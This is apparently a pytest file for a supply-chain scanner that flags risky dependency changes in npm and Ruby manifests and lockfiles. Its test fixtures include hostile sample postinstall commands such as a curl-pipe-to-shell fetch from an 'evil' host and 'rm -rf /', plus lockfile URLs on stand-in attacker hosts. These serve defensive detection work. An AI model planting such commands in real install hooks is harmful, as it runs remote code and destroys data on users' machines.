"""Unit tests for the no-network manifest/lockfile supply-chain diff helper.

Covers the four pr-review Step 2.5 checks promoted from skill prose to a
deterministic, refuter-groundable engine helper:
  2.5a new direct dependency (listing / NIT)
  2.5b lockfile resolved host is not the expected registry (FIX)
  2.5c new install lifecycle script (FIX)
  2.5d non-registry dependency source (FIX)

Every check is a PURE PARSE of unified-diff text: no network, no subprocess.
"""

from __future__ import annotations

import pytest

from chameleon_mcp.dep_diff import (
    MANIFEST_LOCKFILE_BASENAMES,
    collect_dependency_findings,
    is_uncovered_manifest,
    render_findings,
    scan_dependency_diff,
)


def _findings_by_check(findings, check):
    return [f for f in findings if f.check == check]


# ---------------------------------------------------------------------------
# uncovered-manifest detection: a changed dependency manifest of an ecosystem
# the scanner does not parse must read as "not covered", never a silent clean.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "path",
    [
        "requirements.txt",
        "requirements-dev.txt",
        "requirements/base.txt",
        "pyproject.toml",
        "Pipfile",
        "setup.py",
        "setup.cfg",
        "go.mod",
        "go.sum",
        "Cargo.toml",
        "composer.json",
        "backend/requirements.txt",
    ],
)
def test_python_and_other_ecosystem_manifests_are_uncovered(path):
    assert is_uncovered_manifest(path) is True


@pytest.mark.parametrize(
    "path",
    [
        "package.json",
        "package-lock.json",
        "Gemfile",
        "Gemfile.lock",
        "yarn.lock",
        "pnpm-lock.yaml",
    ],
)
def test_parsed_npm_bundler_manifests_are_not_uncovered(path):
    # A covered manifest is parsed, not surfaced as uncovered -- no double-count.
    assert is_uncovered_manifest(path) is False


@pytest.mark.parametrize("path", ["src/app.py", "README.txt", "notes.txt", "config.yml"])
def test_ordinary_files_are_not_uncovered_manifests(path):
    # A stray .txt or a source file must not be mistaken for a dependency manifest.
    assert is_uncovered_manifest(path) is False


# ---------------------------------------------------------------------------
# 2.5c — new install lifecycle script (FIX)
# ---------------------------------------------------------------------------


def test_new_postinstall_script_is_flagged_fix():
    diff = (
        "diff --git a/package.json b/package.json\n"
        "--- a/package.json\n"
        "+++ b/package.json\n"
        "@@ -4,6 +4,7 @@\n"
        '   "scripts": {\n'
        '     "build": "tsc",\n'
        '+    "postinstall": "node ./scripts/setup.js",\n'
        '     "test": "vitest"\n'
        "   },\n"
    )
    findings = scan_dependency_diff({"package.json": diff})
    hits = _findings_by_check(findings, "install-script")
    assert len(hits) == 1
    assert hits[0].severity == "FIX"
    assert hits[0].path == "package.json"
    assert "postinstall" in hits[0].evidence


def test_edited_existing_build_script_is_not_flagged():
    # A non-lifecycle script key (build/test/start) is never an install hook.
    diff = (
        "--- a/package.json\n"
        "+++ b/package.json\n"
        "@@ -4,3 +4,3 @@\n"
        '-    "build": "tsc",\n'
        '+    "build": "tsc --noEmit",\n'
    )
    findings = scan_dependency_diff({"package.json": diff})
    assert _findings_by_check(findings, "install-script") == []


# ---------------------------------------------------------------------------
# 2.5d — non-registry dependency source (FIX)
# ---------------------------------------------------------------------------


def test_git_source_dependency_is_flagged_fix():
    diff = (
        "--- a/package.json\n"
        "+++ b/package.json\n"
        "@@ -8,2 +8,3 @@\n"
        '   "dependencies": {\n'
        '+    "leftpad": "git+https://github.com/evil/leftpad.git",\n'
        '     "react": "^18.0.0"\n'
    )
    findings = scan_dependency_diff({"package.json": diff})
    hits = _findings_by_check(findings, "non-registry-source")
    assert len(hits) == 1
    assert hits[0].severity == "FIX"
    assert hits[0].detail.get("name") == "leftpad"
    assert "git+https" in hits[0].detail.get("source", "")


def test_file_source_dependency_is_flagged():
    diff = (
        "--- a/package.json\n"
        "+++ b/package.json\n"
        "@@ -8,1 +8,2 @@\n"
        '+    "local-thing": "file:../local-thing",\n'
    )
    findings = scan_dependency_diff({"package.json": diff})
    assert len(_findings_by_check(findings, "non-registry-source")) == 1


def test_normal_semver_dependency_is_not_flagged():
    # The dominant case: a registry version range must never fire 2.5d.
    diff = '--- a/package.json\n+++ b/package.json\n@@ -8,1 +8,2 @@\n+    "lodash": "^4.17.21",\n'
    findings = scan_dependency_diff({"package.json": diff})
    assert _findings_by_check(findings, "non-registry-source") == []


def test_repository_metadata_field_is_not_mistaken_for_a_source():
    # `repository`/`homepage`/`bugs` legitimately hold git/https URLs and are
    # NOT dependency sources.
    diff = (
        "--- a/package.json\n"
        "+++ b/package.json\n"
        "@@ -2,2 +2,4 @@\n"
        '+  "repository": "git+https://github.com/me/mypkg.git",\n'
        '+  "homepage": "https://example.com/mypkg",\n'
    )
    findings = scan_dependency_diff({"package.json": diff})
    assert _findings_by_check(findings, "non-registry-source") == []


def test_gemfile_git_source_is_flagged():
    diff = (
        "--- a/Gemfile\n"
        "+++ b/Gemfile\n"
        "@@ -3,1 +3,2 @@\n"
        '+gem "rails", git: "https://github.com/evil/rails.git"\n'
    )
    findings = scan_dependency_diff({"Gemfile": diff})
    assert len(_findings_by_check(findings, "non-registry-source")) == 1


# ---------------------------------------------------------------------------
# 2.5b — lockfile resolved host is not the expected registry (FIX)
# ---------------------------------------------------------------------------


def test_nonregistry_resolved_host_is_flagged_fix():
    diff = (
        "--- a/package-lock.json\n"
        "+++ b/package-lock.json\n"
        "@@ -10,2 +10,3 @@\n"
        '     "node_modules/lodash": {\n'
        '+      "resolved": "https://evil.example.com/lodash/-/lodash-4.17.21.tgz",\n'
        '       "version": "4.17.21"\n'
    )
    findings = scan_dependency_diff({"package-lock.json": diff})
    hits = _findings_by_check(findings, "non-registry-host")
    assert len(hits) == 1
    assert hits[0].severity == "FIX"
    assert hits[0].detail.get("host") == "evil.example.com"


def test_default_npm_registry_host_is_not_flagged():
    diff = (
        "--- a/package-lock.json\n"
        "+++ b/package-lock.json\n"
        "@@ -10,1 +10,2 @@\n"
        '+      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",\n'
    )
    findings = scan_dependency_diff({"package-lock.json": diff})
    assert _findings_by_check(findings, "non-registry-host") == []


def test_yarn_default_registry_host_is_not_flagged():
    # yarn.lock classic resolves against registry.yarnpkg.com by default.
    diff = (
        "--- a/yarn.lock\n"
        "+++ b/yarn.lock\n"
        "@@ -3,1 +3,2 @@\n"
        '+  resolved "https://registry.yarnpkg.com/lodash/-/lodash-4.17.21.tgz#abc"\n'
    )
    findings = scan_dependency_diff({"yarn.lock": diff})
    assert _findings_by_check(findings, "non-registry-host") == []


def test_repo_private_registry_baseline_is_not_flagged():
    # When pre-existing (context) entries consistently use a private host, that
    # host is this repo's normal registry; an added entry on it is not a finding.
    diff = (
        "--- a/package-lock.json\n"
        "+++ b/package-lock.json\n"
        "@@ -10,3 +10,4 @@\n"
        '       "resolved": "https://npm.mycorp.internal/react/-/react-18.0.0.tgz",\n'
        '       "resolved": "https://npm.mycorp.internal/redux/-/redux-4.0.0.tgz",\n'
        '+      "resolved": "https://npm.mycorp.internal/lodash/-/lodash-4.17.21.tgz",\n'
    )
    findings = scan_dependency_diff({"package-lock.json": diff})
    assert _findings_by_check(findings, "non-registry-host") == []


def test_new_foreign_host_flagged_even_with_private_baseline():
    diff = (
        "--- a/package-lock.json\n"
        "+++ b/package-lock.json\n"
        "@@ -10,3 +10,4 @@\n"
        '       "resolved": "https://npm.mycorp.internal/react/-/react-18.0.0.tgz",\n'
        '+      "resolved": "https://evil.example.com/lodash/-/lodash-4.17.21.tgz",\n'
    )
    findings = scan_dependency_diff({"package-lock.json": diff})
    hits = _findings_by_check(findings, "non-registry-host")
    assert len(hits) == 1
    assert hits[0].detail.get("host") == "evil.example.com"


def test_gemfile_lock_nonrubygems_remote_is_flagged():
    diff = (
        "--- a/Gemfile.lock\n"
        "+++ b/Gemfile.lock\n"
        "@@ -1,3 +1,4 @@\n"
        " GEM\n"
        "+  remote: https://gems.evil.example/\n"
    )
    findings = scan_dependency_diff({"Gemfile.lock": diff})
    assert len(_findings_by_check(findings, "non-registry-host")) == 1


# ---------------------------------------------------------------------------
# 2.5a — new direct dependency (NIT listing)
# ---------------------------------------------------------------------------


def test_new_direct_dependency_is_listed_nit():
    diff = (
        "--- a/package.json\n"
        "+++ b/package.json\n"
        "@@ -8,2 +8,3 @@\n"
        '   "dependencies": {\n'
        '+    "left-pad": "^1.3.0",\n'
        '     "react": "^18.0.0"\n'
    )
    findings = scan_dependency_diff({"package.json": diff})
    hits = _findings_by_check(findings, "new-dependency")
    assert len(hits) == 1
    assert hits[0].severity == "NIT"
    assert hits[0].detail.get("name") == "left-pad"


def test_version_bump_of_existing_dependency_is_not_new():
    diff = (
        "--- a/package.json\n"
        "+++ b/package.json\n"
        "@@ -8,2 +8,2 @@\n"
        '-    "lodash": "^4.0.0",\n'
        '+    "lodash": "^4.17.21",\n'
    )
    findings = scan_dependency_diff({"package.json": diff})
    assert _findings_by_check(findings, "new-dependency") == []


def test_added_script_is_not_a_new_dependency():
    # A command value (not a version range) must not be read as a dependency.
    diff = (
        "--- a/package.json\n"
        "+++ b/package.json\n"
        "@@ -4,1 +4,2 @@\n"
        '+    "lint": "eslint . --max-warnings 0",\n'
    )
    findings = scan_dependency_diff({"package.json": diff})
    assert _findings_by_check(findings, "new-dependency") == []


def test_new_gem_is_listed_nit():
    diff = '--- a/Gemfile\n+++ b/Gemfile\n@@ -3,1 +3,2 @@\n+gem "nokogiri", "~> 1.15"\n'
    findings = scan_dependency_diff({"Gemfile": diff})
    hits = _findings_by_check(findings, "new-dependency")
    assert len(hits) == 1
    assert hits[0].detail.get("name") == "nokogiri"


# ---------------------------------------------------------------------------
# fail-open / robustness
# ---------------------------------------------------------------------------


def test_empty_and_garbage_inputs_yield_no_findings():
    assert scan_dependency_diff({}) == []
    assert scan_dependency_diff({"package.json": ""}) == []
    assert scan_dependency_diff({"package.json": "\x00\x00not a diff\xff"}) == []
    assert scan_dependency_diff({"README.md": "+ anything goes here"}) == []
    # Non-string values must not crash.
    assert scan_dependency_diff({"package.json": None}) == []  # type: ignore[dict-item]


# ---------------------------------------------------------------------------
# collect_dependency_findings — routing + git-fetcher injection (no real git)
# ---------------------------------------------------------------------------


def test_collect_routes_only_manifest_and_lockfile_paths():
    fetched = []

    def fake_fetch(path):
        fetched.append(path)
        if path == "client/package.json":
            return (
                "--- a/client/package.json\n"
                "+++ b/client/package.json\n"
                "@@ -4,1 +4,2 @@\n"
                '+    "postinstall": "node ./x.js",\n'
            )
        return ""

    changed = [
        "client/package.json",
        "src/index.ts",  # not a manifest -> never fetched
        "README.md",
    ]
    findings = collect_dependency_findings(changed, fake_fetch)
    # Only the manifest path was fetched.
    assert fetched == ["client/package.json"]
    assert len(_findings_by_check(findings, "install-script")) == 1


def test_collect_fetcher_returning_none_or_raising_fails_open():
    def bad_fetch(path):
        raise RuntimeError("git blew up")

    findings = collect_dependency_findings(["package.json"], bad_fetch)
    assert findings == []

    findings = collect_dependency_findings(["package.json"], lambda p: None)
    assert findings == []


def test_manifest_basenames_cover_the_documented_set():
    assert {
        "package.json",
        "package-lock.json",
        "npm-shrinkwrap.json",
        "yarn.lock",
        "pnpm-lock.yaml",
        "Gemfile",
        "Gemfile.lock",
    } == set(MANIFEST_LOCKFILE_BASENAMES)


# ---------------------------------------------------------------------------
# render_findings — sanitized, severity-grouped advisory lines for pr-review
# ---------------------------------------------------------------------------


def test_render_findings_groups_and_sanitizes():
    diff = (
        "--- a/package.json\n"
        "+++ b/package.json\n"
        "@@ -4,1 +4,3 @@\n"
        '+    "postinstall": "node ./scripts/\x07setup.js",\n'
        '+    "left-pad": "^1.3.0",\n'
    )
    findings = scan_dependency_diff({"package.json": diff})
    lines = render_findings(findings)
    body = "\n".join(lines)
    # Control byte stripped by sanitization.
    assert "\x07" not in body
    # Both a FIX (install-script) and a NIT (new-dependency) are represented.
    assert any("install-script" in line or "postinstall" in line for line in lines)
    assert any("left-pad" in line for line in lines)


def test_render_findings_empty_is_empty():
    assert render_findings([]) == []


# ---------------------------------------------------------------------------
# C3.3 review fixes — FP/FN guards found by adversarial review
# ---------------------------------------------------------------------------


def test_dependency_named_install_is_not_an_install_script():
    # The npm package "install" is real; "install": "^1.0.0" in dependencies is
    # a dependency value, NOT a lifecycle script command.
    diff = '--- a/package.json\n+++ b/package.json\n@@ -8,1 +8,2 @@\n+    "install": "^1.0.0",\n'
    findings = scan_dependency_diff({"package.json": diff})
    assert _findings_by_check(findings, "install-script") == []
    # ...but it IS surfaced as a new dependency.
    assert len(_findings_by_check(findings, "new-dependency")) == 1


def test_real_install_script_command_still_flagged():
    diff = (
        "--- a/package.json\n"
        "+++ b/package.json\n"
        "@@ -4,1 +4,2 @@\n"
        '+    "install": "node-gyp rebuild",\n'
    )
    findings = scan_dependency_diff({"package.json": diff})
    assert len(_findings_by_check(findings, "install-script")) == 1


def test_bare_git_shorthand_with_ref_is_flagged():
    diff = (
        "--- a/package.json\n"
        "+++ b/package.json\n"
        "@@ -8,1 +8,2 @@\n"
        '+    "patched-lib": "user/repo#v2.1.0",\n'
    )
    findings = scan_dependency_diff({"package.json": diff})
    assert len(_findings_by_check(findings, "non-registry-source")) == 1


def test_relative_path_value_is_not_mistaken_for_git_shorthand():
    # "main"/"types" path values look like user/repo but are NOT dependency
    # sources; only the #ref form (unambiguous) is flagged.
    diff = (
        "--- a/package.json\n"
        "+++ b/package.json\n"
        "@@ -2,2 +2,4 @@\n"
        '+  "main": "lib/index.js",\n'
        '+  "types": "dist/index.d.ts",\n'
    )
    findings = scan_dependency_diff({"package.json": diff})
    assert _findings_by_check(findings, "non-registry-source") == []


def test_yarn_berry_resolution_nonregistry_host_is_flagged():
    diff = (
        "--- a/yarn.lock\n"
        "+++ b/yarn.lock\n"
        "@@ -3,1 +3,2 @@\n"
        '+    resolution: "lodash@https://evil.example.com/lodash-4.17.21.tgz"\n'
    )
    findings = scan_dependency_diff({"yarn.lock": diff})
    hits = _findings_by_check(findings, "non-registry-host")
    assert len(hits) == 1
    assert hits[0].detail.get("host") == "evil.example.com"


def test_yarn_berry_npm_resolution_is_not_flagged():
    diff = (
        '--- a/yarn.lock\n+++ b/yarn.lock\n@@ -3,1 +3,2 @@\n+    resolution: "lodash@npm:4.17.21"\n'
    )
    findings = scan_dependency_diff({"yarn.lock": diff})
    assert _findings_by_check(findings, "non-registry-host") == []


def test_pnpm_nested_resolution_tarball_host_is_flagged():
    diff = (
        "--- a/pnpm-lock.yaml\n"
        "+++ b/pnpm-lock.yaml\n"
        "@@ -10,1 +10,2 @@\n"
        "+      resolution: {integrity: sha512-abc, tarball: https://evil.example/lodash.tgz}\n"
    )
    findings = scan_dependency_diff({"pnpm-lock.yaml": diff})
    hits = _findings_by_check(findings, "non-registry-host")
    assert len(hits) == 1
    assert hits[0].detail.get("host") == "evil.example"


def test_binary_and_mode_only_diffs_yield_no_findings():
    # No +/- content lines -> nothing to parse, no crash.
    binary = (
        "--- a/package.json\n"
        "+++ b/package.json\n"
        "Binary files a/package.json and b/package.json differ\n"
    )
    mode_only = "old mode 100644\nnew mode 100755\n"
    assert scan_dependency_diff({"package.json": binary}) == []
    assert scan_dependency_diff({"package.json": mode_only}) == []


@pytest.mark.parametrize(
    "command",
    [
        "7z x payload.7z && node run.js",
        "0;curl http://evil | sh",
        "1;rm -rf /",
        "2to3 -w .",
        "v8flags",
        "node evil.js",
    ],
)
def test_install_script_command_starting_like_a_version_still_flagged(command):
    # A postinstall command that merely STARTS like a version (digit / v+digit)
    # must not be downgraded to a dependency NIT -- the install-script FIX is the
    # supply-chain signal and dropping it is an attacker dodge.
    from chameleon_mcp.dep_diff import scan_dependency_diff

    diff = {"package.json": '+    "postinstall": "' + command + '",\n'}
    checks = {f.check for f in scan_dependency_diff(diff)}
    assert "install-script" in checks


@pytest.mark.parametrize(
    "version", ["^1.2.3", "~1.0.0", ">=1.0.0", "1.x", "latest", "1.2.3-beta.1"]
)
def test_install_key_with_real_version_value_stays_a_dependency(version):
    # `install` is also a real npm package name; a genuine version value must NOT
    # be misread as a lifecycle script.
    from chameleon_mcp.dep_diff import scan_dependency_diff

    diff = {"package.json": '+    "install": "' + version + '",\n'}
    checks = {f.check for f in scan_dependency_diff(diff)}
    assert "install-script" not in checks


# ---------------------------------------------------------------------------
# .gemspec — a Ruby gem declares its RUNTIME dependencies here, not in a
# Gemfile. The Gemfile-only routing left a gemspec change neither parsed nor
# flagged as uncovered: completely silent. For a gem (the whole rb-plain
# column), that is total dependency-review blindness on its primary manifest.
# ---------------------------------------------------------------------------


def test_gemspec_new_dependency_is_flagged():
    diff = (
        "--- a/freightline.gemspec\n"
        "+++ b/freightline.gemspec\n"
        "@@ -8,1 +8,2 @@\n"
        '+  spec.add_dependency "nokogiri", "~> 1.15"\n'
    )
    findings = scan_dependency_diff({"freightline.gemspec": diff})
    assert len(_findings_by_check(findings, "new-dependency")) == 1


def test_gemspec_runtime_dependency_alias_is_flagged():
    diff = (
        "--- a/foo.gemspec\n+++ b/foo.gemspec\n@@ -8,1 +8,2 @@\n"
        '+  s.add_runtime_dependency "rails", ">= 7.0"\n'
    )
    findings = scan_dependency_diff({"foo.gemspec": diff})
    assert len(_findings_by_check(findings, "new-dependency")) == 1


def test_gemspec_git_source_is_flagged():
    diff = (
        "--- a/foo.gemspec\n+++ b/foo.gemspec\n@@ -8,1 +8,2 @@\n"
        '+  spec.add_dependency "rails", git: "https://github.com/evil/rails.git"\n'
    )
    findings = scan_dependency_diff({"foo.gemspec": diff})
    assert len(_findings_by_check(findings, "non-registry-source")) == 1


def test_gemspec_is_a_covered_manifest_not_uncovered():
    # Ruby is a covered ecosystem, so a gemspec must route to the gem scanners,
    # NOT be reported as an unparsed uncovered manifest.
    assert is_uncovered_manifest("freightline.gemspec") is False
    assert is_uncovered_manifest("lib/foo.gemspec") is False


def test_gemspec_is_collected_for_scanning():
    from chameleon_mcp.dep_diff import collect_dependency_findings

    def _diff(_path):
        return (
            "--- a/foo.gemspec\n+++ b/foo.gemspec\n@@ -8,1 +8,2 @@\n"
            '+  spec.add_dependency "evilpkg"\n'
        )

    findings = collect_dependency_findings(["foo.gemspec"], _diff)
    assert len(_findings_by_check(findings, "new-dependency")) == 1
